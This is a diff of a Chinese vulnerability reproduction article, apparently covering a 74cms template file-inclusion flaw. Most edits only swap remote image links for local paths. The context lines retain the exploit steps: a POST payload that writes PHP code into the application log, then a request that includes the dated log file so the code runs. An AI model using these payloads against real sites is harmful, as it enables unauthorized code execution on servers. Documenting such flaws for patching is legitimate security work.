@@ -67,13 +67,13 @@ relation_type: "duplicate_of"
 
 ==============
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicoAP7KAOdlQKQH7icgPrVvd95pknLRgAEfDicbplLJ9Cia19PODjjRVWdA/640?wx_fmt=jpeg)
+![](../../.resource/remote/f5dbb995703912f20c0e51e4b4123191ea250568b21be35e0312082f47a67960.jpg)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicgGqHicRiaBheHxicetKshNUddiablLYruE76ytRUWA5Bu3zrrMcXdzib8Bw/640?wx_fmt=jpeg)
+![](../../.resource/remote/bef9bb4837ca13080321408ec12eaff0e25e50bca8ca4dfd16f9254efd1d9c1f.jpg)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGic74ywjKznASBpH22nUDVuCjcE4fS1ibIGIibZhmmtaxKbND4LNejy5S1A/640?wx_fmt=jpeg)
+![](../../.resource/remote/2460dd8b8d267b1aafe85ca447906047da3d3f108b584adfa82b7ee6317f9989.jpg)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicqribu12sm7df7BDmHf8GFMX3cho0l98IUSXjmicUdrGhljniblVykEstw/640?wx_fmt=png)
+![](../../.resource/remote/24024cf0b84bfcd3a3491d83c07f389404d4b30bfefe49541859e5cfdd9eee24.png)
 
 **四、漏洞概述**
 
@@ -115,13 +115,13 @@ variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="
 
  可以看到返回了错误，日志已经记录了
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicrxOfnV3cBe7QicQ22G0T0nATsXkI39odfFWhH7uCmI82M69G7UVftEg/640?wx_fmt=png)
+![](../../.resource/remote/70451e15bc02e7f258f56e49b82b6e59b6004407a52004f9e7f8437f0057fa06.png)
 
 我们来翻一下日志
 
 成功写入
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGictBfqpTfB2Jhf8gJPdaibpOlov0IJia88jZNnNpVouNOOb1V774LE5qpQ/640?wx_fmt=png)
+![](../../.resource/remote/5eef1efda7d17a6e31bc1facb74ced7936fe6d24956ab7c06122338e2d3ebc34.png)
 
 接下来我们尝试包含日志，日志名称就是测试当天的年月日
 
@@ -144,7 +144,7 @@ POST:
 variable=1&tpl=data/Runtime/Logs/Home/20_12_22.log
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicJ9QLXAHXnNHreCAXcuSDEz3q0wL7AmpjDAwrHFRib2zM9tibtHkNZkfQ/640?wx_fmt=png)
+![](../../.resource/remote/ac8f25b91b975bab3b15c87fa5a78d2b0af02e7a43946d323b8e4eab1b32d7ea.png)
 
 **六、修复建议**  
 
